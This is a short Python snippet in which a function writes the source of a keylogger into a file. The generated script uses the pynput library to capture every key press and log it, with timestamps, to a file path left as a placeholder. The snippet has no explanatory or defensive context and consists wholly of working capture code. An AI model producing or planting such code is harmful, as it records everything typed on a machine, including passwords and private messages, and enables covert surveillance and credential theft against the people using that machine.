def content(function):
    function.write("from pynput.keyboard import Key, Listener\nimport logging\n\nlogging.basicConfig(filename='your log file path', level=logging.DEBUG, format=' %(asctime)s - %(message)s')\n\ndef on_press(key):\n    logging.info(str(key))\n\nwith Listener(on_press=on_press) as listener:\n    listener.join()")
